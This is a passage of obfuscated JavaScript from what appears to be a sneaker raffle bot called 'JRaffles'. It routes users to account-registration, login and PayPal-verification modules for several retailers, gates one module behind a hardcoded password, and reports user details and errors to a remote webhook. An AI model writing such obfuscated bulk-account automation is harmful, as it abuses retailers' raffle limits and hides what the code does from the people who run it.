                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x5e7099 = await _0x47ea1e(), _0x44f49e = await _0x107b61();
                                                return await _0x2f363d('', _0x1488cc, _0x44f49e, _0x5e7099), _0xd70cc6();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1adfd5[taskModule]['name'] == 'SLAM\x20JAM') {
                                            taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                                            var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                                            console['clear']();
                                            if (taskFunction == 0x0) {
                                                var _0x5e7099 = await _0x47ea1e(), _0x46caa1 = await _0x107b61();
                                                return await _0x8b37be('https://slamjam.nl/account/register', _0x1488cc, _0x46caa1, _0x5e7099), _0xd70cc6();
                                            } else {
                                                if (taskFunction == 0x1) {
                                                    var _0x5e7099 = await _0x47ea1e(), _0x46caa1 = await _0x107b61();
                                                    return await _0x18b0de('', _0x1488cc, _0x46caa1, _0x5e7099), _0xd70cc6();
                                                }
                                            }
                                            ;
                                        } else {
                                            if (_0x1adfd5[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                                                var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
                                                    var _0x5e7099 = await _0x47ea1e(), _0x3e7d4b = await _0x107b61();
                                                    return await _0x338e14('https://www.kickz.com/nl/login/', _0x1488cc, _0x3e7d4b, _0x5e7099), _0xd70cc6();
                                                } else {
                                                    if (taskFunction == 0x1) {
                                                        var _0x5e7099 = await _0x47ea1e(), _0x3e7d4b = await _0x107b61();
                                                        return await _0x369bcb(_0x1488cc, _0x3e7d4b, _0x5e7099), _0xd70cc6();
                                                    }
                                                }
                                                ;
                                            } else {
                                                if (_0x1adfd5[taskModule]['name'] == 'JD') {
                                                    taskFunction = await _0x6bf5fb(_0x1adfd5[taskModule]['modules']);
                                                    var _0x1488cc = _0x1adfd5[taskModule]['modules'][taskFunction];
                                                    console['clear']();
                                                    if (taskFunction == 0x0) {
                                                        var _0x5e7099 = await _0x47ea1e(), _0x329f60 = await _0x107b61();
                                                        return await _0xc7ab42(_0x1488cc, _0x329f60, _0x5e7099), _0xd70cc6();
                                                    }
                                                } else {
                                                    if (_0x1adfd5[taskModule]['name'] == 'Seven\x20Store')
                                                        return console['log']('returning\x20to\x20menu'), await _0x4a79d2(0x3e8), _0xd70cc6();
                                                    else {
                                                        if (_0x1adfd5[taskModule]['name'] == 'Paypal\x20Verification') {
                                                            var _0x3acf11 = _0x1adfd5[taskModule]['name'];
                                                            const _0x5e382a = await _0x52fae4();
                                                            var _0x4701b3 = _0x5e382a['split'](';');
                                                            await _0x478a2d(_0x4701b3, _0x3acf11);
                                                        } else {
                                                            if (_0x1adfd5[taskModule]['name'] == 'Change\x20Settings') {
                                                                console['log']('Choose\x20a\x20Setting\x20to\x20change\x20:\x0a');
                                                                var _0x415c04 = 0x0;
                                                                for (const _0x5f09c5 in _0xff80bf) {
                                                                    console['log']('(' + _0x415c04 + ')\x20' + _0x5f09c5 + '\x20:\x20' + _0xff80bf[_0x5f09c5]), _0x415c04++;
                                                                }
                                                                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('(' + _0x415c04 + ')\x20Return\x20to\x20Main\x20Menu');
                                                                var _0x4f1fc0 = await _0x5803ee();
                                                                if (_0x4f1fc0 == _0x415c04)
                                                                    return _0xd70cc6();
                                                                console['clear'];
                                                                var _0x27ed79 = 0x0;
                                                                for (var _0x40cc33 in _0xff80bf) {
                                                                    if (_0x4f1fc0 == _0x27ed79) {
                                                                        console['log']('Changing:\x20\x0a\x20\x0a\x20' + _0x40cc33 + '\x20:'), _0xff80bf[_0x40cc33] = await _0x490da6(), _0x7af797['writeFileSync']('../settings.json', JSON['stringify'](_0xff80bf));
                                                                        break;
                                                                    } else
                                                                        _0x27ed79++;
                                                                }
                                                                return console['log']('Settings\x20Saved!'), await _0x4a79d2(0xbb8), _0xd70cc6();
                                                            } else {
                                                                if (_0x1adfd5[taskModule]['name'] == 'Reload\x20Settings')
                                                                    return console['log']('Reloading\x20settings'), await _0x5852b5(), _0xd70cc6();
                                                                else {
                                                                    if (taskModule == 0x45) {
                                                                        _0x1adfd5[0x45] = { 'name': 'AFEW\x20SECRET' };
                                                                        var _0x562a44 = await _0x9f998c();
                                                                        _0x562a44 == 'ModuleVoorDeBoys' ? (await _0x1bad40(), await _0x1806f5(), await afewFunction(_0x5e9464[_0x15cea2], 'sec')) : (console['log']('Wrong\x20password,\x20closing\x20in\x2010\x20seconds...'), await _0x4a79d2(0xbb8));
                                                                    } else {
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
            await _0xd70cc6();
        } catch (_0xfb6170) {
            return console['log'](_0xfb6170), await _0x4a79d2(0x3a98);
        }
}
;
_0x1dc4b6('JRaffles\x20' + _0x49c529), _0x5852b5();
try {
    _0x905fb9();
} catch (_0x3e7b75) {
    var _0x339653 = [{
        'type': 'rich',
        'title': 'Main\x20Menu\x20Error',
        'description': '',
        'color': 0xc0d6d6,
        'fields': [
            {
                'name': 'User',
                'value': '' + _0x446b97
            },
            {
                'name': 'Version',
                'value': '' + _0x49c529
            },
            {
                'name': 'Error',
                'value': '' + _0x3e7b75
            }
        ]
    }];
    const _0x2b513e = { 'embeds': _0x339653 };
    _0x2110d2(_0x132dc8, _0x2b513e);
}